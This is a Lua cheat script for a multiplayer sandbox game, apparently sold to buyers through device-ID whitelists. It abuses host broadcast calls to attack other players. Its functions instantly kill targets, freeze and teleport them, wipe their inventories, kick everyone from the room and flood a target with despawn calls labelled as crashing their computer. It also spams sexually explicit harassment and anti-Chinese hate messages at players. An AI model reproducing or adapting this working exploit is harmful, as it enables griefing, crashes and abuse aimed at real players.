                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t3) 
                            end)
                            
                            -- 造成伤害
                            local t4 = {
                                [1] = "actor",
                                [2] = "playerHurt",
                                [3] = {myUin, targetUin, 1.8e+308, 0}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t4) 
                            end)
                            
                            -- 每100次提示进度
                            if loopCount % 100 == 0 then
                                ShowGameTipsWithoutFilter("#c00ffff本轮进度 " .. loopCount .. "/1000")
                            end
                            -- 循环内部无任何等待，一次性跑完1000次
                        end

                        -- 1000次全部跑完后判断开关，关闭就直接跳出
                        if not _G.dtms_enabled then
                            break
                        end
                        
                        ShowGameTipsWithoutFilter("#c00ffff1000次秒杀完成，暂停1秒缓冲防崩溃")
                        -- 仅整轮结束后等待1秒缓冲
                        threadpool:wait(5)
                    end
                    
                    -- 结束恢复目标攻击权限
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 32, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00已恢复目标的攻击能力")
                    end)
                    
                    ShowGameTipsWithoutFilter("#cFF0000秒杀循环已终止")
                end)
            end
            -- ====================
        end
    end
)
end


function zdcr()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author6[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止\n右边开启并选择目标",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止 =====
            _G.cr_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000已停止")
            
            -- 可选：恢复所有玩家移动
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.cr_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}  -- true = 恢复移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffff已恢复所有玩家移动")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启 =====
            _G.cr_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000请先进入游戏房间")
                _G.cr_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000当前房间没有其他玩家")
                _G.cr_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择目标",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要的玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击开始")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---

                
                ShowGameTipsWithoutFilter("#c00ffff已选择玩家：" .. targetUin .. "，开始循环到自己头上")
                
                -- 启动循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.cr_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 功能：传送到头上 =====
                        local myX, myY, myZ = CurMainPlayer:getPosition(0, 0, 0)
                        local target_x, target_y, target_z = myX / 100, myY / 100 -0.1, myZ / 100+1
                        
                        
                        local tdata1 = {
                            [1] = "player",
                            [2] = "setPosition",
                            [3] = { targetUin, target_x, target_y, target_z }
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1) 
                        end)
                        -- =================================
                        
                        -- ===== 禁止移动功能 =====
                        local tdata2 = {}
                        tdata2[1] = "player"
                        tdata2[2] = "setActionAttrState"
                        tdata2[3] = {targetUin, 1, false}  -- false = 禁止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2) 
                        end)
                        
 local tdata3 = {
                            [1] = "player",
                            [2] = "playAct",
                            [3] = {targetUin, 15}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata3) 
                        end)
                        local tdata4 = {
                            [1] = "player",
                            [2] = "notifyGameInfo2Self",
                            [3] = {targetUin, "啊~~爸爸的78好大,我好喜欢,用力~啊~用力"}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata4) 
                        end)
                        
                        local tdata5 = {
                            [1] = "player",
                            [2] = "notifyGameInfo2Self",
                            [3] = {AccountManager:getUin(), "啊~~爸爸的78好大,我好喜欢,用力~啊~用力"}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata5) 
                        end)
                        
                        
                        MusicClubSyncIns:sysncEquipWeapon(AccountManager:getUin(), 12285)
CurMainPlayer:playAct(600113)
                        
                        
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x = x / 100
local new_y = y / 100
local new_z = z / 100
threadpool:wait(0.1) 
CurWorld:playSoundAndParticleEffect(new_x, new_y, new_z, 'buff.buff_balala_xiaolan', 70, 50, 0, new_x, new_y, new_z, 0, 1, 100)
                        
                        
                        
                        -- =======================
                        
                        -- 每10次显示一次提示
                       
                        
                        threadpool:wait(0.1)  -- 0.01秒执行一次（非常快）
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000循环结束")
                end)
            end
            -- ====================
        end
    end
)
end

function zdtzw()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author5[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 默认配置
local defaultItemId = 15509  -- 默认火龙果

-- 先弹出输入框让用户输入物品ID
ShowTextInputSafe(function(text)
    local itemId = tonumber(text)
    if not itemId or itemId <= 0 then
        ShowGameTipsWithoutFilter("#cFF0000请输入有效的物品ID！")
        return
    end
    
    -- 显示确认对话框
    GetInst("MessageBoxInterface"):dualBtnBox(
        "左边停止\n右边开启\n#c00ffff当前物品ID：" .. itemId,
        "控制",
        nil,
        function(userData, btnType)
            if btnType == 0 then  -- 左边按钮：停止
                _G.ztmn_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000已停止")
                
            elseif btnType == 1 then  -- 右边按钮：开启
                _G.ztmn_enabled = true
                ShowGameTipsWithoutFilter("#c00ffff已开启 - 物品ID：" .. itemId)
                
                -- 启动炸图循环
                threadpool:work(function()
                    while _G.ztmn_enabled do
                        -- 获取自己当前位置
                        local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                        local center_x = my_x / 100
                        local center_y = my_y / 100
                        local center_z = my_z / 100
                        
                        -- 向四面八方发射（8个方向）
                        for angle = 0, 315, 45 do
                            local rad = math.rad(angle)
                            local distance = math.random(50, 100)
                            local target_x = center_x + math.cos(rad) * distance
                            local target_z = center_z + math.sin(rad) * distance
                            local target_y = center_y
                            
                            -- 发射投掷物（使用自定义物品ID）
                            local tdata = {
                                [1] = "world",
                                [2] = "spawnProjectile",
                                [3] = {
                                    AccountManager:getUin(),
                                    itemId,  -- 使用自定义ID
                                    center_x, center_y + 2, center_z,
                                    target_x, target_y, target_z,
                                    500
                                }
                            }
                            
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                        
                        threadpool:wait(0.2)
                    end
                end)
            end
        end
    )
end, "请输入物品ID", "设置", "15509")
end

function ExecuteAntiBotLogic()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author1[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("#R开启成功")
for a=0,100000 do 
    threadpool:wait(0.00000001)
    
    trigger()
local curHp = GameVM.Trigger.Player:getPlayerAttr(AccountManager:getUin(), PLAYERATTR.CUR_HP)
-- 判断血量低于1时执行死亡逻辑
if curHp < 1 then
    -- 延迟极短时间，等待游戏底层血量状态同步完成
    threadpool:wait(0.00000001)
              -- 获取自己的迷你号
    -- 先拿到自己的迷你号，用来过滤
local myUin = AccountManager:getUin()
local num = ClientCurGame:getNumPlayerBriefInfo()
for i = 1, num do
    local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
    -- 增加 briefInfo.uin ~= myUin 排除自己
    if briefInfo and briefInfo.uin and briefInfo.uin > 1000 and briefInfo.uin ~= myUin then
 
 for a=0,1000 do
 
            local tdata = {
                [1] = "player",
                [2] = "notifyGameInfo2Self",
                [3] = { briefInfo.uin, "#R我真棒我给你妈挂在天花板上面艹，你妈说，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹#R我给你妈挂在天花板上面艹，你妈说我真棒，伸出舌头给我灵魂之口，还说我的好大，说要让我做你干爹" }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
 end
local tdata = {
        [1] = "gamerule",
        [2] = "setAllowMidwayJoin",
        [3] = { 0 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

  threadpool:wait(0.01)
    AccountManager.cluster.buddysvr.routemore('gm.kick', briefInfo.uin,0)
    end -- 补全if闭合
end -- 补全for循环闭合


end
end
end




function bdn()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author2[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("#R开启成功，会卡一段时间")

 ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
    for a=0,1000000 do 
        local tdata = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    end, "崩电脑")

end


function xhjs()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("#R开启成功")
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止\n右边开启",
    "关闭",
    nil,
    function(userData, btnType)
        if btnType == 0 then
            _G.dffz_enabled = false
            -- 不要停止线程，让它自己检测到 false 后退出
            ShowGameTipsWithoutFilter("#cFF0000已停止")
            
        elseif btnType == 1 then
            -- 重置状态
            _G.dffz_enabled = false
            
            -- 等待旧线程完全退出（如果有的话）
            if _G.dffz_thread then
                -- 不调用 stop，让线程自然退出
                _G.dffz_thread = nil
            end
            
            -- 延迟一下再开启，确保旧线程已退出
            threadpool:wait(0.1)
            
            _G.dffz_enabled = true
            ShowGameTipsWithoutFilter("#c00ffff已开启")
            
            if whitelist == nil then
                whitelist = {}
            end
            
            -- 使用 threadpool:work 创建新线程
            _G.dffz_thread = threadpool:work(function()
                local loopCount = 0
                while _G.dffz_enabled do
                    loopCount = loopCount + 1
                    
                    xpcall(function()
                        local myUin = AccountManager:getUin()
                        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                        
                        for i = 1, size do
                            if not _G.dffz_enabled then break end
                            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                            if targetPlayer then
                                local targetUin = targetPlayer:getUin()
                                if targetUin ~= myUin then
                                    if not whitelist[targetUin] then
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "changPlayerMoveType"
                                        tdata[3] = {targetUin, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetTimeVanishingSpeed"
                                        tdata[3] = {500}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "changeViewMode"
                                        tdata[3] = {targetUin, 9, true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "forceOpenBoxUI"
                                        tdata[3] = {targetUin, 797}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "forceOpenBoxUI"
                                        tdata[3] = {targetUin, 798}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "changeCustomModel"
                                        tdata[3] = {targetUin, "role_11"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFAAFF- 豪气横扫万里山河#cFFFFAA越南万岁！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFAAFF- 豪气横扫万里山河#cFFFFAA越南万岁！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFBBEE- 豪光统治九方天地#cEEFFAA越南威严！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFBBEE- 豪光统治九方天地#cEEFFAA越南威严！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFCCDD- 神龙长啸震动乾坤#cDDFFAA越南坚强！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFCCDD- 神龙长啸震动乾坤#cDDFFAA越南坚强！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFDDCC- 掌握命运誓保江山#cCCFFAA南国雄伟！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFDDCC- 掌握命运誓保江山#cCCFFAA南国雄伟！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)


                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFEEBB- 圣光照耀万界#cBBFFAA越南闪耀！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFEEBB- 圣光照耀万界#cBBFFAA越南闪耀！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)


                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFAAFF- 扫除破坏者守护和平#cAAFFAA越南永存！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFAAFF- 扫除破坏者守护和平#cAAFFAA越南永存！", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFBBEE- 神圣光辉扫除邪恶的中国污秽。", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFBBEE- 神圣光辉扫除邪恶的中国污秽。", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "notifyGameInfo2Self"
                                        tdata[3] = {targetUin, "#cFFFFAA中国#cEEFFAA是肮#cDDFFAA脏的#cCCFFAA垃圾#cBBFFAA需要#cAAFFAA被消"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "setnickname"
                                        tdata[3] = {targetUin, "#b#R越南万岁！"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "backpack"
                                        tdata[2] = "clearAllPack"
                                        tdata[3] = {targetUin}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {targetUin, 1, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {myUin, 64, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {myUin, 128, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30005, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30006, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30007, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30008, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30009, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playerHurt"
                                        tdata[3] = {myUin, targetUin, 1.8e+308, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setAtt"
                                        tdata[3] = {targetUin, 1, 2}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "yanhua", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "12834", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "bossskill_lasertailblue", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "ice_bingshi_boss", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "mob_3514_white", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "nengliang_xiqu", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "nengliang_baozha", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {targetUin, "jiguang01", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                    end
                                end
                            end
                        end
                    end, function(err)
                        print("Lỗi vòng lặp gây treo/văng bản đồ: " .. tostring(err))
                    end)
                    
                    -- 使用 threadpool:wait
                    threadpool:wait(0.0000001)
                end
                print("Vòng lặp dọn dẹp bản đồ đã kết thúc")
                _G.dffz_thread = nil  -- 线程退出后清空引用
            end)
        end
    end
)
	end
	
function mswsbmd()
	
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author4[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Trái: Tắt tính năng giết ngay lập tức\nPhải: Bật tính năng giết ngay lập tức và chọn mục tiêu",  -- 消息内容
    "Dừng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Siêu tiêu diệt đã kết thúc")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Vui lòng vào phòng trò chơi trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Hiện không có người chơi nào khác trong phòng này")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择秒杀目标",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要秒杀的玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击开始秒杀")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
